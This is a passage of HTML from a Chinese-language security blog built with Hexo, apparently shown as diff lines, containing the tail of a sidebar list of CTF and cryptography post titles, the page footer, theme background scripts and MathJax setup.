Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/05/03/0x1A/">GGCTF的对称密码学</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/17/0x19/">How old are Crypto?</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/08/0x18/">MySQLi-Error Injection</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/04/0x17/">Python 使用dpkt分析数据包</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/01/0x16/">CRYPTO技能修正</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/21/0x15/">Pentester Lab Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/17/0x14/">0CTF RSA?总结 || RSA学习笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/15/0x13/">This is AliCTF?</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/14/0x12/">0CTF总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/07/0x11/">unholy Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/02/14/0x0F/">Nebula Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/12/19/0x0E/">12.19网络方向培训</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/12/08/0x0D/">HCTF之Black-Eat-Black总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/12/01/0x0C/">Python 的 BaseHTTPServer模块分析小结</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/10/31/0x0B/">10.31新生培训</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/10/05/0x09/">不使用select情况下的各种盲注</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/10/03/0x08/">2015XDCTF低分web题writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/08/07/0x06/">WeChall Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/07/22/0x04/">git小记</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/07/19/0x02/">对于硬盘事件的随想</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/07/19/0x01/">对于这次硬盘坏掉事件小记</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/07/19/0x00/">跳转到以前的博文</a></li></ul>
+
+
+
+
+    <script>
+        
+    </script>
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                &copy; 2017 Hcamael
+            </div>
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank" title="快速、简洁且高效的博客框架">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减 Hexo 双栏博客主题">Yelee</a> by MOxFIVE
+            </div>
+        </div>
+        
+    </div>
+</footer>
+    </div>
+    
+<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.1.22/require.min.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            var iPad = window.navigator.userAgent.indexOf('iPad');
+            if (iPad > -1 || $(".left-col").css("display") === "none") {
+                var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
+                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
+                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
+            }
+            else {
+                var backgroundnum = 4;
+                var backgroundimg = "url(http://qn.lazysheep.cc/bg/bg-xxxx.jpg)".replace(/xxxx/gi, Math.ceil(Math.random() * backgroundnum));
+                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
+            }
+        })
+    </script>
+
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments" title="查看评论"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
+</div>
+
+    <script src="//cdn.bootcss.com/jqueryui/1.10.4/jquery-ui.min.js"></script>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+  </div><!-- hexo-inject:begin --><!-- Begin: Injected MathJax -->
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({"tex2jax":{"inlineMath":[["$","$"],["\\(","\\)"]],"skipTags":["script","noscript","style","textarea","pre","code"],"processEscapes":true},"TeX":{"equationNumbers":{"autoNumber":"AMS"}}});
+</script>
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for(i=0; i < all.length; i += 1) {
+      all[i].SourceElement().parentNode.className += ' has-jax';
+    }
+  });
+</script>
+
+<script type="text/javascript" src="//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+<!-- End: Injected MathJax -->
+<!-- hexo-inject:end -->
+</body>
+</html>
